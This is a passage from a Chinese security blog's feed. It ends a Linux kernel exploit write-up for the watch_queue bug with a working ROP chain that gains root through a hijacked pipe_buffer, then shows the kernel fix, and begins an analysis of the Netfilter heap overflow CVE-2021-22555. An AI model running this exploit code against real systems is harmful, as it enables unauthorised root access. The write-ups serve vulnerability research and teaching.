class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8183b4d3</span> + kernel_offset;<span class="comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span></span><br><span class="line">    ops_ptr-&gt;confirm = <span class="number">0xffffffff81689ea4</span> + kernel_offset;<span class="comment">// pop rdx ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/04/06/Fk975jsZhPfvyCJ.png" alt="image.png"></p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>该漏洞在内核主线的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb">这个 commit</a> 中被修复，这个 commit 增加的修改比较多，我们主要关注对于该漏洞其改变的部分：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -320,7 +319,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,</span><br><span class="line">     tf[i].info_mask &amp; WATCH_INFO_LENGTH)</span><br><span class="line"> goto err_filter;</span><br><span class="line"> /* Ignore any unknown types */</span><br><span class="line"><span class="deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * 8)</span></span><br><span class="line"><span class="addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span></span><br><span class="line"> continue;</span><br><span class="line"> nr_filter++;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">@@ -336,7 +335,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,</span><br><span class="line"> </span><br><span class="line"> q = wfilter-&gt;filters;</span><br><span class="line"> for (i = 0; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</span></span><br><span class="line"><span class="addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span></span><br><span class="line"> continue;</span><br><span class="line"> </span><br><span class="line"> q-&gt;type= tf[i].type;</span><br></pre></td></tr></table></figure><ul><li>修复了前后判定不一致的问题</li><li>将 type 的范围限定为 <code>WATCH_TYPE__NR</code>（值为 2）</li></ul><p>笔者个人认为这个修复还是比较成功的</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我在看着你👁_👁&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/"/>
    <id>http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/</id>
    <published>2022-03-31T16:18:06.000Z</published>
    <updated>2022-04-06T09:26:32.000Z</updated>
    
    <content type="html"><![CDATA[<p><del>喷子永远是版本答案</del></p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2021-22555 是 Linux Netfilter 模块中的一个堆溢出漏洞，漏洞主要发生在64 位系统上为 32 位进程处理 setsockopt 时，若指定了 optname 为 <code>IPT_SO_SET_REPLACE</code>（或 <code>IP6T_SO_SET_REPLACE</code>），且开启了内核选项 <code>CONFIG_USER_NS</code> 、<code>CONFIG_NET_NS</code>，在内核结构转换时由于错误计算转换大小则会导致内核堆上的越界写入一些 0 字节，从而覆写相邻 object</p><p>该漏洞自内核版本 <code>v2.6.19-rc1</code> （<code>9fa492cdc160cd27ce1046cb36f47d3b2b1efa21</code>）引入，在这些版本中被修复：</p><ul><li><code>5.12 (b29c457a6511435960115c0f548c4360d5f4801d), 5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267</code></li></ul><p>由于其影响范围极大，且利用较为简单，故获得了 <code>7.8</code> 的 CVSS 评分</p><p>在开始分析之前，我们先来补充一些前置知识</p><blockquote><p>本文主要参考了 bsauce 大师傅对该漏洞的分析与利用过程：<a href="https://www.anquanke.com/post/id/254027">https://www.anquanke.com/post/id/254027</a></p><p>本文中涉及到的内核源码为 <code>5.8</code> 版本</p></blockquote><h2 id="内核编译选项"><a href="#内核编译选项" class="headerlink" title="内核编译选项"></a><em>内核编译选项</em></h2><p>首先是所有 <code>CONFIG_IP_NF_**</code> 和 <code>CONFIG_NETFILTER_**</code> 相关的选项都要打开</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_IP_NF_IPTABLES=y</span><br><span class="line">CONFIG_IP_NF_MATCH_AH=y</span><br><span class="line">CONFIG_IP_NF_MATCH_ECN=y</span><br><span class="line">CONFIG_IP_NF_MATCH_RPFILTER=y</span><br><span class="line">CONFIG_IP_NF_MATCH_TTL=y</span><br><span class="line">CONFIG_IP_NF_FILTER=y</span><br><span class="line">CONFIG_IP_NF_TARGET_REJECT=y</span><br><span class="line">CONFIG_IP_NF_TARGET_SYNPROXY=y</span><br><span class="line">CONFIG_IP_NF_NAT=y</span><br><span class="line">CONFIG_IP_NF_TARGET_MASQUERADE=y</span><br><span class="line">CONFIG_IP_NF_TARGET_NETMAP=y</span><br><span class="line">CONFIG_IP_NF_TARGET_REDIRECT=y</span><br><span class="line">CONFIG_IP_NF_MANGLE=y</span><br><span class="line">CONFIG_IP_NF_TARGET_CLUSTERIP=y</span><br><span class="line">CONFIG_IP_NF_TARGET_ECN=y</span><br><span class="line">CONFIG_IP_NF_TARGET_TTL=y</span><br><span class="line">CONFIG_IP_NF_RAW=y</span><br><span class="line">CONFIG_IP_NF_SECURITY=y</span><br><span class="line">CONFIG_IP_NF_ARPTABLES=y</span><br><span class="line">CONFIG_IP_NF_ARPFILTER=y</span><br><span class="line">CONFIG_IP_NF_ARP_MANGLE=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER=y</span><br><span class="line">CONFIG_NETFILTER_ADVANCED=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_INGRESS=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK=y</span><br><span class="line">CONFIG_NETFILTER_FAMILY_BRIDGE=y</span><br><span class="line">CONFIG_NETFILTER_FAMILY_ARP=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_ACCT=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_QUEUE=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_LOG=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_OSF=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_CONNCOUNT=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_NETLINK_GLUE_CT=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_SYNPROXY=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_XTABLES=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_XT_MARK=y</span><br><span class="line">CONFIG_NETFILTER_XT_CONNMARK=y</span><br><span class="line">CONFIG_NETFILTER_XT_SET=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_XT_MATCH_U32=y</span><br><span class="line"><span class="comment"># 挺多的，这里笔者就不一一摘录了</span></span><br></pre></td></tr></table></figure><p>以及三个其他选项：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_USER_NS=y</span><br><span class="line">CONFIG_NET_NS=y</span><br><span class="line">CONFIG_COMPAT=y</span><br></pre></td></tr></table></figure><h2 id="Netfilter"><a href="#Netfilter" class="headerlink" title="Netfilter"></a>Netfilter</h2><p>Netfilter 为 Linux 内核中的一个子模块，用以提供数据包过滤、网络地址转换、端口转换等功能，其整体框架如下图所示</p><p><img src="https://s2.loli.net/2022/03/28/SFpO9z7YRykLnqU.png" alt="Netfilter components"></p><p>例如 <code>iptables</code> 等工具便是利用 Netfilter 所提供的接口实现的，不过本篇我们主要关注其在内核中的部分</p><p>Netfilter 涵盖了内核网络协议栈的多层，一个数据包在 Netfilter 中的历程如下图所示：</p><p><img src="https://s2.loli.net/2022/03/28/8UnfDE7Mry1uhgW.png" alt="image.png"></p><p>在 Netfilter 中有一种名为 「table」 的结构，用以存储不同功能的配置信息，在内核当中使用 <code>xt_table</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Furniture shopping... */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* What hooks you will enter on */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> valid_hooks;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Man behind the curtain... */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">private</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set this to THIS_MODULE if you are a module, otherwise NULL */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">me</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int8_t</span> af;<span class="comment">/* address/protocol family */</span></span><br><span class="line"><span class="type">int</span> priority;<span class="comment">/* hook order */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* called when table is needed in the given netns */</span></span><br><span class="line"><span class="type">int</span> (*table_init)(<span class="keyword">struct</span> net *net);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* A unique name... */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> name[XT_TABLE_MAXNAMELEN];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该结构其实是一层 wrapper，其核心结构为 <code>xt_table_info</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The table itself */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> &#123;</span></span><br><span class="line"><span class="comment">/* Size per table */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line"><span class="comment">/* Number of entries: FIXME. --RR */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> number;</span><br><span class="line"><span class="comment">/* Initial number of entries. Needed for module usage count */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> initial_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Entry points and underflows */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hook_entry[NF_INET_NUMHOOKS];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> underflow[NF_INET_NUMHOOKS];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of user chains. Since tables cannot have loops, at most</span></span><br><span class="line"><span class="comment"> * @stacksize jumps (number of user chains) can possibly be made.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> stacksize;</span><br><span class="line"><span class="type">void</span> ***jumpstack;<span class="comment">// 我超，三级指针！</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> entries[] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在每张  table 上有多个 chain，对应表示报文的拦截处理点，例如网络层中的 IP协议 便有 5 个拦截点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---&gt;[NF_IP_PRE_ROUTING]---&gt;[ROUTE]---&gt;[NF_IP_FORWARD]---&gt;[NF_IP_POST_ROUTING]---&gt;</span><br><span class="line">                              |                        ^</span><br><span class="line">                              |                        |</span><br><span class="line">                              |                     [ROUTE]</span><br><span class="line">                              v                        |</span><br><span class="line">                       [NF_IP_LOCAL_IN]        [NF_IP_LOCAL_OUT]</span><br><span class="line">                              |                        ^</span><br><span class="line">                              |                        |</span><br><span class="line">                              v                        |</span><br><span class="line">                             --------Local Process-------</span><br></pre></td></tr></table></figure><p>在每个 chain 中还有一些用户配置的 rule，一条 rule 可能包含一个或多个匹配规则（match）和一个执行动作（target），若报文 match 了，则执行 target 来处理报文；标准的匹配元素包含源&#x2F;目的IP地址、接收&#x2F;发送设备、传输层协议这五个元素，标准的执行动作包含 <code>accept</code>、<code>drop</code>、<code>queue</code>、<code>return</code></p><p>每条 rule 使用一个 <code>ipt_entry</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This structure defines each of the firewall rules.  Consists of 3</span></span><br><span class="line"><span class="comment">   parts which are 1) general IP header stuff 2) match specific</span></span><br><span class="line"><span class="comment">   stuff 3) the target to perform if the rule matches */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipt_ip</span> <span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark with fields that we care about. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nfcache;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of ipt_entry + matches */</span></span><br><span class="line">__u16 target_offset;</span><br><span class="line"><span class="comment">/* Size of ipt_entry + matches + target */</span></span><br><span class="line">__u16 next_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Back pointer */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> comefrom;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Packet and byte counters. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_counters</span> <span class="title">counters</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The matches (if any), then the target. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> elems[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而 rule 和 target 则分别使用 <code>xt_entry_match</code> 与 <code>xt_entry_target</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 match_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used by userspace */</span></span><br><span class="line"><span class="type">char</span> name[XT_EXTENSION_MAXNAMELEN];</span><br><span class="line">__u8 revision;</span><br><span class="line">&#125; user;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 match_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used inside the kernel */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_match</span> *<span class="title">match</span>;</span></span><br><span class="line">&#125; kernel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Total length */</span></span><br><span class="line">__u16 match_size;</span><br><span class="line">&#125; u;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 target_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used by userspace */</span></span><br><span class="line"><span class="type">char</span> name[XT_EXTENSION_MAXNAMELEN];</span><br><span class="line">__u8 revision;</span><br><span class="line">&#125; user;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 target_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used inside the kernel */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span>;</span></span><br><span class="line">&#125; kernel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Total length */</span></span><br><span class="line">__u16 target_size;</span><br><span class="line">&#125; u;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>table-&gt;chain-&gt;rule</code> 的关系如下图所示，这里我们可以看到对于单个 rule 在每个 CPU 上都维护了一份他的拷贝，这样做的目的是为了减少锁的使用、增加 L1 cache 的命中次数，以空间换时间</p><p><img src="https://s2.loli.net/2022/03/29/4hwpn7HdagVIiQL.png" alt="image.png"></p><h2 id="64-位下的-setsockopt-系统调用"><a href="#64-位下的-setsockopt-系统调用" class="headerlink" title="64 位下的 setsockopt 系统调用"></a><em>64 位下的 setsockopt 系统调用</em></h2><blockquote><p>和本漏洞没有关联，但是笔者没注意给分析了一遍…花了挺多力气所以这里也不想删了，就留下来了，如果只关注漏洞本身的可以直接跳过XD 感兴趣的话可以简单看看</p></blockquote><p>用户进程与 Netfilter 间进行通信主要是通过 <code>getsockopt</code> 与 <code>setsockopt</code> 这两个系统调用，这是一套配对使用的系统调用，用以读取或修改套接字的配置信息，我们这一次主要关注 <code>setsockopt</code></p><blockquote><p>本次漏洞利用中我们创建 socket 时使用 <code>socket(AF_INTE, SOCK_STREAM, 0)</code>，故后面涉及到的 socket 源码都会顺着这个路径分析</p></blockquote><p>在 <code>setsockopt</code> 系统调用中会调用到内核中的 <code>__sys_setsockopt()</code> ，最终调用到对应的 socket 结构体的函数表中的 <code>setsockopt</code> 函数指针（ <code>sock-&gt;ops-&gt;setsockopt()</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __sys_setsockopt(<span class="type">int</span> fd, <span class="type">int</span> level, <span class="type">int</span> optname,</span><br><span class="line">    <span class="type">char</span> __user *optval, <span class="type">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">err =</span><br><span class="line">    sock_setsockopt(sock, level, optname, optval,</span><br><span class="line">    optlen);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">err =</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval,</span><br><span class="line">  optlen);</span><br></pre></td></tr></table></figure><p>这个函数表其实是在 socket 创建时（<code>__sock_create()</code>）进行动态指定的，通过对应 family 指定的创建函数进行创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sock_create(<span class="keyword">struct</span> net *net, <span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol,</span><br><span class="line"> <span class="keyword">struct</span> socket **res, <span class="type">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">pf = rcu_dereference(net_families[family]);</span><br><span class="line">err = -EAFNOSUPPORT;</span><br><span class="line"><span class="keyword">if</span> (!pf)</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment"> * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(pf-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">err = pf-&gt;create(net, sock, protocol, kern);</span><br></pre></td></tr></table></figure><p>比如说对于 <code>AF_INET</code> （<code>PF_INET</code>）而言，应该用到的是 <code>inet_create()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet_family_ops</span> =</span> &#123;</span><br><span class="line">.family = PF_INET,</span><br><span class="line">.create = inet_create,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>inet_init()</code> 函数中使用 <code>sock_register</code> 在 <code>net_families</code> 数组中注册了该结构体（<code>__init</code> 宏可以看出这是一个模块初始化函数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init 